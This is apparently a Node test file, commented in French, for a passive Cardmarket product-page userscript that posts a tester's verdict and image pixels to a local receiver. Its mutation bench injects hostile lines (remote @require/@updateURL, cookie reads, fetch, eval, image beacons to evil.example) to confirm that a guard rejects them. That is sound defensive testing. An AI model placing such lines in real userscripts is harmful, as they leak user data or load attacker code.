// node test-userscript-cardmarket-fiche.js — le userscript PASSIF des fiches produit Cardmarket (userscript-cardmarket-fiche.js).
//  · STATIQUE : garde (collecte-cartes/garde-userscript-passif.js, profil « cardmarket-fiche ») + bancs MUTANTS en mémoire.
//  · COMPORTEMENT : bac `vm`, DOM FABRIQUÉ, aucune requête réelle, aucun chemin du testeur.
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const R = require('./recepteur-cardmarket-fiche');
const G = require('./collecte-cartes/garde-userscript-passif');
const CM = require('./collecte-cartes/cm-passif');
const LISTE = JSON.parse(fs.readFileSync(path.join(__dirname, 'collecte-cartes', 'cm-passif-liste.json'), 'utf8'));

let ok = 0, ko = 0;
const verifier = (nom, obtenu, attendu) => {
    const a = JSON.stringify(obtenu), b = JSON.stringify(attendu);
    if (a === b) { ok++; console.log(`✅ ${nom}`); } else { ko++; console.log(`❌ ${nom}\n   obtenu  ${a}\n   attendu ${b}`); }
};

const FICHIER = path.resolve(process.env.CMF_USERSCRIPT || path.join(__dirname, 'userscript-cardmarket-fiche.js'));
const SRC = fs.readFileSync(FICHIER, 'utf8');
const m = /^\/\/ ==UserScript==\r?\n([\s\S]*?)\r?\n\/\/ ==\/UserScript==/.exec(SRC);
verifier('l\'en-tête ==UserScript== existe', !!m, true);
const code = SRC.slice(m ? m[0].length : 0);
const sansCommentaires = code.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:\\'"`])\/\/[^\n]*/g, '$1');
const P = 'cardmarket-fiche';

// ── STATIQUE
verifier('GARDE : le userscript livré n\'a aucune violation', G.violations(SRC, P), []);
verifier('le profil par défaut de la garde (Collectorviper) REFUSE ce script : un profil n\'ouvre pas l\'autre', G.violations(SRC).length > 0, true);
verifier('@match : les fiches produit seulement', /^\/\/ @match\s+https:\/\/www\.cardmarket\.com\/\*\/Pokemon\/Products\/Singles\/\*$/m.test(m ? m[1] : ''), true);
verifier('@version 1.0, @grant GM_xmlhttpRequest seul, @connect 127.0.0.1 seul, @noframes', [/@version\s+1\.0\s*$/m.test(m[1]), (m[1].match(/@grant/g) || []).length, (m[1].match(/@connect\s+127\.0\.0\.1\s*$/gm) || []).length, (m[1].match(/@connect/g) || []).length, /@noframes/.test(m[1])], [true, 1, 1, 1, true]);
const PORT_US = /^\s*var PORT = (\d{4,5});/m.exec(code);
verifier('PORT : constante unique, égale au port du récepteur (8768)', [!!PORT_US, Number(PORT_US?.[1]) === R.PORT_DEFAUT, R.PORT_DEFAUT], [true, true, 8768]);
const ENTETE_US = /'X-Rat-Market':\s*'([^']+)'/.exec(code);
verifier('l\'en-tête fixe du script est celui que le récepteur exige', [R.ENTETE_MARQUE, ENTETE_US?.[1]], ['x-rat-market', R.VALEUR_MARQUE]);
const num = nom => { const r = new RegExp(`var ${nom} = ([^;]+);`).exec(code); return r ? Function(`return (${r[1]})`)() : null; };
verifier('IMAGE_OCTETS_MAX du script ≤ celui du récepteur', num('IMAGE_OCTETS_MAX') > 0 && num('IMAGE_OCTETS_MAX') <= R.IMAGE_OCTETS_MAX, true);
verifier('redirections refusées sur le POST local', /redirect: 'error'/.test(sansCommentaires), true);
verifier('la seule lecture d\'octets : le canvas des pixels AFFICHÉS (drawImage + toDataURL, chacun une fois)', [(sansCommentaires.match(/\.drawImage\s*\(/g) || []).length, (sansCommentaires.match(/\.toDataURL\s*\(/g) || []).length], [1, 1]);
verifier('ni new Image, ni crossOrigin, ni fetch, ni XMLHttpRequest, ni innerHTML dans le code', /new\s+Image|crossOrigin|fetch|XMLHttpRequest|innerHTML|insertAdjacentHTML|sendBeacon/.test(sansCommentaires), false);
verifier('trois écouteurs de clic (les trois verdicts), aucun autre', (sansCommentaires.match(/addEventListener\s*\(/g) || []).length, 3);
const listeEmbarquee = (() => { const r = /var LISTE = (\{[\s\S]*?\n    \});/.exec(code); return r ? Function(`return (${r[1]})`)() : null; })();
verifier('liste embarquée : 128 adresses', listeEmbarquee ? Object.keys(listeEmbarquee).length : -1, 128);
verifier('liste embarquée == collecte-cartes/cm-passif-liste.json (une seule vérité)', (() => { const idx = CM.indexer(LISTE); const ids = Object.keys(idx); return listeEmbarquee && ids.length === Object.keys(listeEmbarquee).length && ids.every(k => { const e = listeEmbarquee[k]; const i = idx[k]; return e && e.n === i.n && e.v === i.v && e.i === i.idProduct && e.t === i.tampon && e.s === i.set && e.o === i.numero; }); })(), true);

const apresPort = charge => SRC.replace('var PORT = 8768;', 'var PORT = 8768;\n' + charge);
const dansEntete = ligne => SRC.replace('// @noframes', '// @noframes\n' + ligne);
const mutants = [
    ['en-tête : @match hors fiches (tout Cardmarket)', SRC.replace('// @match        https://www.cardmarket.com/*/Pokemon/Products/Singles/*', '// @match        https://www.cardmarket.com/*')],
    ['en-tête : @match tous sites', SRC.replace('// @match        https://www.cardmarket.com/*/Pokemon/Products/Singles/*', '// @match        *://*/*')],
    ['en-tête : second @match', dansEntete('// @match        https://evil.example/*')],
    ['en-tête : @match d\'une autre catégorie (Magic)', SRC.replace('/Pokemon/Products/Singles/*', '/Magic/Products/Singles/*')],
    ['en-tête : @connect autre que 127.0.0.1', SRC.replace('// @connect      127.0.0.1', '// @connect      www.cardmarket.com')],
    ['en-tête : second @connect', dansEntete('// @connect      evil.example')],
    ['en-tête : @connect *', SRC.replace('// @connect      127.0.0.1', '// @connect      *')],
    ['en-tête : @require', dansEntete('// @require      https://evil.example/x.js')],
    ['en-tête : @resource', dansEntete('// @resource     css https://evil.example/a.css')],
    ['en-tête : @updateURL', dansEntete('// @updateURL    https://evil.example/u.js')],
    ['en-tête : directive inconnue (@unwrap)', dansEntete('// @unwrap')],
    ['en-tête : @grant GM_download', SRC.replace('// @grant        GM_xmlhttpRequest', '// @grant        GM_xmlhttpRequest\n// @grant        GM_download')],
    ['en-tête : @grant unsafeWindow', SRC.replace('// @grant        GM_xmlhttpRequest', '// @grant        unsafeWindow')],
    ['en-tête : sans @noframes', SRC.replace('// @noframes\n', '')],
    ['corps : new Image', apresPort('var a = new Image();')],
    ['corps : crossOrigin posé', apresPort('var i = document.createElement(\'canvas\'); i.crossOrigin = PORT;')],
    ['corps : fetch', apresPort('var f = fetch(\'http://127.0.0.1:1/\');')],
    ['corps : fetch par chaîne', apresPort('var f = window[\'fe\' + \'tch\'];')],
    ['corps : XMLHttpRequest', apresPort('var x = new XMLHttpRequest();')],
    ['corps : second GM_xmlhttpRequest', apresPort('GM_xmlhttpRequest({});')],
    ['corps : GM_download', apresPort('GM_download(\'x\');')],
    ['corps : navigation location = …', apresPort('location = PORT;')],
    ['corps : navigation location.href = …', apresPort('location.href = PORT;')],
    ['corps : location.assign', apresPort('location.assign(PORT);')],
    ['corps : window.open', apresPort('window.open(PORT);')],
    ['corps : clic programmatique .click()', apresPort('document.createElement(\'div\').click();')],
    ['corps : cookie', apresPort('var c = document.cookie;')],
    ['corps : localStorage', apresPort('var c = localStorage;')],
    ['corps : adresse https écrite (hors de la liste embarquée)', apresPort('var u = \'https://evil.example/x\';')],
    ['corps : hôte nu écrit', apresPort('var u = \'evil.example/x\';')],
    ['corps : gabarit de chaîne', apresPort('var u = `//evil.example/${PORT}`;')],
    ['corps : innerHTML', apresPort('var i = document.createElement(\'div\'); i.innerHTML = PORT;')],
    ['corps : <img src> dans une chaîne', apresPort('var l = \'<img src="//evil.example/p.png">\';')],
    ['corps : img.src = …', apresPort('var i = document.createElement(\'canvas\'); i.src = PORT;')],
    ['corps : createElement(\'img\')', apresPort('var i = document.createElement(\'img\');')],
    ['corps : createElement(\'script\')', apresPort('var i = document.createElement(\'script\');')],
    ['corps : setTimeout', apresPort('setTimeout(function () {}, 1);')],
    ['corps : eval', apresPort('eval(PORT);')],
    ['corps : sendBeacon', apresPort('document.sendBeacon(\'x\');')],
    ['corps : new Audio', apresPort('var a = new Audio(\'x\');')],
    ['corps : toBlob / createImageBitmap', apresPort('var a = createImageBitmap(PORT);')],
    ['corps : accès indexé calculé', apresPort('var d = document[PORT + 1];')],
    ['corps : fonction non déclarée appelée par un nom nu', apresPort('quelqueChose(PORT);')],
    ['corps : méthode hors liste (.postMessage)', apresPort('document.postMessage(PORT);')]
];
for (const [nom, texteMute] of mutants) verifier(`la garde REFUSE : ${nom}`, G.violations(texteMute, P).length > 0, true);
verifier('contrôle du banc : un texte sans mutation reste admis', G.violations(apresPort(''), P), []);

// ── COMPORTEMENT
const SIG = Buffer.from('89504e470d0a1a0a', 'hex');
const b64 = (n = 1) => Buffer.concat([SIG, Buffer.alloc(30, n)]).toString('base64');
const el = (o = {}) => ({ textContent: '', style: {}, children: [], ecouteurs: {}, tagName: 'DIV', parentElement: null, addEventListener(t, f) { this.ecouteurs[t] = f; }, appendChild(c) { this.children.push(c); return c; }, ...o });
const image = (n, { w = 400, h = 560, complete = true, tainted = false, src = 'https://images-exemple.test/51/MEP/894262/894262.jpg' } = {}) =>
    ({ _n: n, tagName: 'IMG', naturalWidth: complete ? w : 0, naturalHeight: complete ? h : 0, complete, currentSrc: src, src, tainted });

const PATH_V1 = '/en/Pokemon/Products/Singles/MEP-Black-Star-Promos/Slowbro-MEP083';
function fabriquerMonde({ images = [image(1)], h1 = 'Slowbro [All Out | Zen Headbutt] (MEP083)', pathname = PATH_V1, hostname = 'www.cardmarket.com', erreur = null, reponses = null } = {}) {
    const appels = [], acces = { cookie: 0, canvasCrees: 0, dessinees: [], toDataURL: 0 };
    const doc = el({ title: 'x', body: el() });
    Object.defineProperty(doc, 'cookie', { get() { acces.cookie++; return 'secret=1'; } });
    doc.querySelectorAll = s => (s === 'img' ? images : []);
    doc.querySelector = s => (s === 'h1' && h1 !== null ? el({ tagName: 'H1', textContent: `  ${h1}\n ` }) : null);
    const elements = [];
    doc.createElement = tag => {
        if (tag === 'canvas') {
            acces.canvasCrees++;
            const c = el({ tag, width: 0, height: 0 });
            c.getContext = () => ({ drawImage(img) { c._img = img; acces.dessinees.push(img._n); } });
            c.toDataURL = () => { acces.toDataURL++; if (c._img.tainted) { const e = new Error('The canvas has been tainted by cross-origin data.'); e.name = 'SecurityError'; throw e; } return 'data:image/png;base64,' + b64(c._img._n); };
            return c;
        }
        const e = el({ tag }); elements.push(e); return e;
    };
    doc.body.appendChild = c => c;
    const location = { href: `https://${hostname}${pathname}`, origin: `https://${hostname}`, hostname, pathname, search: '', hash: '' };
    const GM_xmlhttpRequest = o => {
        appels.push(o);
        setTimeout(() => {
            if (erreur) return o.onerror?.({ error: erreur });
            const r = reponses ? reponses(JSON.parse(o.data), appels.length) : null;
            if (r) return o.onload?.(r);
            return o.onload?.({ status: 200, responseText: JSON.stringify({ ok: true, paire: { n: 12, set: 'MEP-Black-Star-Promos', numero: '083', version: 'V1', tamponAttendu: 'Staff' }, horsDesSoixanteQuatre: false, relevees: 1, sur: 128 }) });
        }, 0);
    };
    const bac = { document: doc, location, GM_xmlhttpRequest, window: { location, document: doc }, console, JSON, Date, String, Number, Math, Array, Object, URL, RegExp, Promise, Error };
    bac.window.window = bac.window;
    return { bac, appels, acces, elements };
}
const attendre = ms => new Promise(r => setTimeout(r, ms));
const lancer = w => vm.runInNewContext(SRC, w.bac, { filename: 'userscript-cardmarket-fiche.js' });
const texte = w => w.elements.map(e => e.textContent).join(' | ');
const boutons = w => w.elements.filter(e => e.tag === 'button' && e.ecouteurs.click);
const cliquer = async (w, i) => { boutons(w)[i].ecouteurs.click({}); await attendre(80); };
const corps = w => w.appels.map(a => JSON.parse(a.data));
const CLES = 'h,idProduct,imageMotif,imageSrc,mime,nom,paquet,pixels,pixelsMotif,schema,titre,url,verdictTesteur,w';
const clesDe = o => Object.keys(o).sort().join(',');

(async () => {
    let w = fabriquerMonde();
    lancer(w);
    const tout = texte(w);
    verifier('chargement : trois boutons, AUCUNE requête, AUCUN canvas, aucune image dessinée', [boutons(w).length, w.appels.length, w.acces.canvasCrees, w.acces.dessinees.length], [3, 0, 0, 0]);
    verifier('les trois boutons portent les trois verdicts, dans cet ordre', boutons(w).map(b => b.textContent), ['Tampon visible', 'Pas de tampon visible', 'Je ne sais pas']);
    verifier('le panneau est fait de div et button seulement', [...new Set(w.elements.map(e => e.tag))].sort(), ['button', 'div']);
    verifier('le panneau reconnaît l\'adresse : paire, version V1, tampon à chercher', [/Staff/.test(tout), /V1/.test(tout), /083/.test(tout)], [true, true, true]);
    await attendre(40);
    verifier('… toujours rien après attente', [w.appels.length, w.acces.canvasCrees], [0, 0]);

    // clic « Tampon visible », canvas lisible
    await cliquer(w, 0);
    let b = corps(w);
    verifier('un clic = UNE requête, POST vers http://127.0.0.1:<port>/releve', [w.appels.length, w.appels[0].method, /^http:\/\/127\.0\.0\.1:8768\/releve$/.test(w.appels[0].url)], [1, 'POST', true]);
    verifier('clés EXACTES du message', clesDe(b[0]), CLES);
    verifier('verdict, adresse (sans requête-chaîne), titre h1 normalisé, schéma', [b[0].verdictTesteur, b[0].url, b[0].titre, b[0].schema], ['tampon-visible', `https://www.cardmarket.com${PATH_V1}`, 'Slowbro [All Out | Zen Headbutt] (MEP083)', 1]);
    verifier('nom : le titre sans la parenthèse finale', b[0].nom, 'Slowbro [All Out | Zen Headbutt]');
    verifier('idProduct lu dans l\'adresse de l\'image affichée (…/894262/894262.jpg)', b[0].idProduct, 894262);
    verifier('adresse de l\'image, dimensions, pixels PNG base64, motif null', [b[0].imageSrc, b[0].w, b[0].h, b[0].mime, b[0].pixels === b64(1), b[0].pixelsMotif], ['https://images-exemple.test/51/MEP/894262/894262.jpg', 400, 560, 'image/png', true, null]);
    verifier('exactement UN canvas, UNE image dessinée, UN toDataURL', [w.acces.canvasCrees, w.acces.dessinees.length, w.acces.toDataURL], [1, 1, 1]);
    verifier('le message passe la validation du récepteur', R.jugerMessage(JSON.stringify(b[0])).statut, 200);
    verifier('le panneau dit la paire reconnue et le compte rendu par le récepteur', [/1 sur 128|1\/128/.test(texte(w)), /Staff/.test(texte(w))], [true, true]);
    verifier('aucun accès aux cookies', w.acces.cookie, 0);

    // les trois verdicts
    for (const [i, v] of [[1, 'pas-de-tampon'], [2, 'ne-sais-pas']]) {
        w = fabriquerMonde(); lancer(w); await cliquer(w, i);
        verifier(`le bouton ${i + 1} porte le verdict « ${v} » et fait le relevé`, [w.appels.length, corps(w)[0].verdictTesteur, R.jugerMessage(w.appels[0].data).statut], [1, v, 200]);
    }

    // canvas protégé
    w = fabriquerMonde({ images: [image(7, { tainted: true })] }); lancer(w); await cliquer(w, 0);
    b = corps(w);
    verifier('canvas protégé : pixels null + motif « canvas-protege », adresse et dimensions gardées, verdict gardé', [b[0].pixels, b[0].pixelsMotif, b[0].mime, b[0].imageSrc, b[0].w, b[0].verdictTesteur], [null, 'canvas-protege', null, 'https://images-exemple.test/51/MEP/894262/894262.jpg', 400, 'tampon-visible']);
    verifier('canvas protégé : UNE seule tentative (un canvas, un dessin, un toDataURL) et UNE seule requête, vers le local', [w.acces.canvasCrees, w.acces.dessinees.length, w.acces.toDataURL, w.appels.length], [1, 1, 1, 1]);
    verifier('canvas protégé : le panneau le dit', /protégé/.test(texte(w)), true);
    verifier('canvas protégé : le message passe la validation du récepteur', R.jugerMessage(w.appels[0].data).statut, 200);

    // image non chargée, aucune image
    w = fabriquerMonde({ images: [image(1, { complete: false })] }); lancer(w); await cliquer(w, 2);
    b = corps(w);
    verifier('image non chargée : pixels null, motif « image-non-chargee », rien dessiné', [b[0].pixels, b[0].pixelsMotif, w.acces.canvasCrees], [null, 'image-non-chargee', 0]);
    w = fabriquerMonde({ images: [] }); lancer(w); await cliquer(w, 2);
    b = corps(w);
    verifier('aucune image : motif « aucune-image », le relevé part quand même (titre + verdict)', [b[0].pixelsMotif, b[0].imageSrc, b[0].idProduct, b[0].verdictTesteur], ['aucune-image', '', null, 'ne-sais-pas']);
    verifier('… et passe la validation du récepteur', R.jugerMessage(w.appels[0].data).statut, 200);

    // choix de l'image principale : la grande image de produit, pas un pictogramme
    w = fabriquerMonde({ images: [image(1, { w: 40, h: 40, src: 'https://static-exemple.test/icon.png' }), image(2, { w: 400, h: 560 })] }); lancer(w); await cliquer(w, 0);
    verifier('l\'image principale est la grande image de produit (le pictogramme n\'est pas dessiné)', w.acces.dessinees, [2]);

    // image rattachée à l'adresse : seule l'image dont le chemin porte /<idProduct attendu>/ est retenue, jamais la plus grande d'un autre produit
    const autre = image(5, { w: 900, h: 1200, src: 'https://images-exemple.test/51/MEP/111111/111111.jpg' });
    w = fabriquerMonde({ images: [autre, image(2, { w: 400, h: 560 })] }); lancer(w); await cliquer(w, 0);
    b = corps(w);
    verifier('image d\'un AUTRE produit plus grande : ignorée, seule l\'image …/894262/… est dessinée et envoyée', [w.acces.dessinees, b[0].imageSrc, b[0].imageMotif, b[0].pixels === b64(2)], [[2], 'https://images-exemple.test/51/MEP/894262/894262.jpg', null, true]);
    w = fabriquerMonde({ images: [autre] }); lancer(w); await cliquer(w, 1);
    b = corps(w);
    verifier('aucune image du produit attendu : pas d\'image, imageMotif « image-du-produit-introuvable », rien dessiné, verdict gardé', [b[0].imageMotif, b[0].imageSrc, b[0].pixels, b[0].pixelsMotif, w.acces.canvasCrees, b[0].verdictTesteur], ['image-du-produit-introuvable', '', null, 'aucune-image', 0, 'pas-de-tampon']);
    verifier('… et le panneau dit « sans image rattachée »', /sans image rattachée/.test(texte(w)), true);
    verifier('… le message passe la validation du récepteur', R.jugerMessage(w.appels[0].data).statut, 200);
    const V2PATH = '/en/Pokemon/Products/Singles/MEP-Black-Star-Promos/Slowbro-V2-MEP083';
    w = fabriquerMonde({ pathname: V2PATH, images: [image(1), image(2, { src: 'https://images-exemple.test/51/MEP/903006/903006.jpg' })] }); lancer(w); await cliquer(w, 0);
    verifier('adresse V2 : c\'est l\'image …/903006/… (idProduct de la V2) qui est retenue', w.acces.dessinees, [2]);

    // adresse hors des 64 : acceptée, marquée
    w = fabriquerMonde({ pathname: '/en/Pokemon/Products/Singles/Base-Set/Pikachu-V1-BS58' }); lancer(w);
    verifier('adresse hors liste : le panneau dit « hors des 64 » avant le clic', /hors des 64/.test(texte(w)), true);
    await cliquer(w, 0);
    verifier('adresse hors liste : le relevé part quand même (une requête)', [w.appels.length, corps(w)[0].url], [1, 'https://www.cardmarket.com/en/Pokemon/Products/Singles/Base-Set/Pikachu-V1-BS58']);

    // pas une fiche produit : rien
    w = fabriquerMonde({ pathname: '/en/Pokemon/Products/Singles/SV-Black-Star-Promos' }); lancer(w); await cliquer(w, 0);
    verifier('page de liste (pas une fiche) : rien lu, rien envoyé, le panneau le dit', [w.appels.length, w.acces.canvasCrees, /fiche/.test(texte(w))], [0, 0, true]);
    w = fabriquerMonde({ hostname: 'exemple.test' }); lancer(w); await cliquer(w, 0);
    verifier('autre hôte : rien lu, rien envoyé', [w.appels.length, w.acces.canvasCrees], [0, 0]);

    // récepteur éteint
    w = fabriquerMonde({ erreur: 'connexion refusée' }); lancer(w); await cliquer(w, 0);
    verifier('récepteur injoignable : une seule tentative, le panneau dit de le lancer', [w.appels.length, /récepteur/i.test(texte(w)), /node recepteur-cardmarket-fiche\.js/.test(texte(w))], [1, true, true]);
    // récepteur qui refuse
    w = fabriquerMonde({ reponses: () => ({ status: 403, responseText: JSON.stringify({ ok: false, motif: 'refus de test' }) }) }); lancer(w); await cliquer(w, 0);
    verifier('récepteur qui refuse : le motif est affiché, une seule requête', [w.appels.length, /refus de test/.test(texte(w))], [1, true]);

    console.log(`\n${ok} réussis, ${ko} en échec`);
    process.exit(ko ? 1 : 0);
})();
